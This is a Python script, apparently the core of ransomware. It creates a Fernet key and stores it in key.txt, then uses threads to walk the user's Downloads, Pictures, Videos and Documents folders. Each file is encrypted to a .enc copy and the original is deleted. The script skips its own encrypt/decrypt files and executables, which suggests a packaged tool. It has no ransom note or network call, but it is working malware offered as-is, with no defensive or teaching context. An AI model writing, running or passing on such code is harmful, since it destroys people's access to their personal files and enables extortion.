import threading
from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open('key.txt', 'wb') as key_file:
        key_file.write(key)

def load_key():
    with open('key.txt', 'rb') as key_file:
        return key_file.read()

def encrypt_file(file_path, key):
    cipher_suite = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = cipher_suite.encrypt(file.read())
    with open(file_path + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)

def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if not file.endswith('.enc') and file not in ['encrypt.py', 'decrypt.py', 'key.txt', 'encrypt.exe', 'decrypt.exe']:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

def encrypt_folder(folder_path, key):
    encrypt_directory(folder_path, key)

def main():
    if not os.path.exists('key.txt'):
        generate_key()

    key = load_key()

    folders_to_encrypt = ['Downloads', 'Pictures', 'Videos', 'Documents']

    threads = []

    for folder in folders_to_encrypt:
        folder_path = os.path.expanduser(f'~/{folder}')
        if os.path.exists(folder_path):
            thread = threading.Thread(target=encrypt_folder, args=(folder_path, key))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
